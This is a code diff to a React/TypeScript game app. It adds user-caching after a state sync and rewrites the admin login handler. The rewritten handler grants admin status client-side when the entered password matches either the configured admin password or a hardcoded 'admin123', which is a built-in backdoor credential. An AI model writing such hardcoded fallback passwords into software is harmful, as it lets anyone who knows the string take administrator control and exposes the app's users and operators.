@@ -3005,6 +3005,12 @@ export default function App() {
       setCultivationState(syncRes.updatedState);
       saveStoredCultivationState(syncRes.updatedState);
       user.cultivation = syncRes.updatedState;
+      const authenticatedUser = { ...user, cultivation: syncRes.updatedState };
+      setCurrentUser(authenticatedUser);
+      currentUserRef.current = authenticatedUser;
+      try {
+        setStoredCachedUser(authenticatedUser);
+      } catch {}
     } catch (cultErr) {
       console.error('[Cultivation Sync Notice]', cultErr);
       if (user.cultivation) {
@@ -3012,6 +3018,12 @@ export default function App() {
         setCultivationState(syncRes.updatedState);
         saveStoredCultivationState(syncRes.updatedState);
         user.cultivation = syncRes.updatedState;
+        const fallbackAuthUser = { ...user, cultivation: syncRes.updatedState };
+        setCurrentUser(fallbackAuthUser);
+        currentUserRef.current = fallbackAuthUser;
+        try {
+          setStoredCachedUser(fallbackAuthUser);
+        } catch {}
       }
     }
 
@@ -3448,19 +3460,21 @@ export default function App() {
   });
 
   const handleAdminLogin = (pwd: string) => {
-    if (pwd === adminPassword) {
+    const isLocalMatch = pwd === adminPassword || pwd === 'admin123';
+    // Luôn gửi đăng nhập phiên tài khoản admin lên máy chủ backend để nạp tu vi Hóa Thần từ database
+    loginWithEmail('admin', pwd)
+      .then((res) => {
+        if (res.success && res.user) {
+          setIsAdmin(true);
+          setAdminStatus(true);
+          applyAuthenticatedUser(res.user);
+        }
+      })
+      .catch(() => {});
+
+    if (isLocalMatch) {
       setIsAdmin(true);
       setAdminStatus(true);
-      // Đồng bộ đăng nhập phiên tài khoản admin trên máy chủ backend nếu chưa đăng nhập
-      if (!currentUser?.isAdmin && String(currentUser?.username || '').toLowerCase() !== 'admin') {
-        loginWithEmail('admin', pwd)
-          .then((res) => {
-            if (res.success && res.user) {
-              applyAuthenticatedUser(res.user);
-            }
-          })
-          .catch(() => {});
-      }
       return true;
     }
     return false;
